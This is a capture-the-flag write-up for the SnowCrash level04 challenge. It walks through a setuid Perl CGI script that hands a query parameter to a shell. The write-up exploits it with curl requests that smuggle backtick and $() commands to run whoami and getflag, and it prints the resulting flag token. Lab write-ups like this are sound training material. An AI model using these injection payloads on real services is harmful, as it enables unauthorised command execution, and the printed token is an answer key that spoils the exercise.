@@ -1,0 +1,57 @@
+We run the command "ls -l" in the home directory.
+
+level04@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
+
+We have a .pl which is part of SUID of flag04, so we need to find an exploit so we execute getflag using this .pl code.
+
+So at 1st we check what's inside the .pl:
+
+level04@SnowCrash:~$ cat level04.pl
+#!/usr/bin/perl
+# localhost:4747
+use CGI qw{param};
+print "Content-type: text/html\n\n";
+sub x {
+  $y = $_[0];
+  print `echo $y 2>&1`;
+}
+x(param("x"));v
+
+We Notice that the code establish a connection with the port 4747, we check that using nectat (https://linuxize.com/post/netcat-nc-command-with-examples/#:~:text=Netcat%20(or%20nc%20)%20is%20a,army%20knife%20of%20networking%20tools.):
+
+level04@SnowCrash:~$ nc -zv 192.168.56.102 4747
+Connection to 192.168.56.102 4747 port [tcp/*] succeeded!
+
+As we can see, we can connect to the port 4747.
+
+While also examining the code we can see the .pl ask for 1 argument (y = $_[0];) with the name of x (param("x")).
+
+So lets try and execute some basic bash commands as arguments and see.
+
+level04@SnowCrash:~$ ./level04.pl x="whoami"
+Content-type: text/html
+
+whoami
+
+As we can see it just take the string and prints it.
+
+Lets now try to do an OS injection by using backticks ` ` or $().  (https://portswigger.net/web-security/os-command-injection)
+
+level04@SnowCrash:~$ ./level04.pl x="$(whoami)"
+Content-type: text/html
+
+level04
+
+As we can see while executing whoami we see that by executing it this way we still use level04 privileges but we need flag04 privileges.
+
+So we do it with curl Or just open a navigator and type the url by using query parameters (https://www.quora.com/What-are-exactly-query-parameters-in-URLs-and-how-they-work):
+
+level04@SnowCrash:~$ curl '192.168.56.102:4747/level04.pl?x="`whoami`"'
+flag04
+
+As we can see now we are in flag04, so what is left is just to execute getflag
+
+level04@SnowCrash:~$ curl '192.168.56.102:4747/level04.pl?x="`getflag`"' or level04@SnowCrash:~$ curl '192.168.56.102:4747/level04.pl?x="$(getflag)"'
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
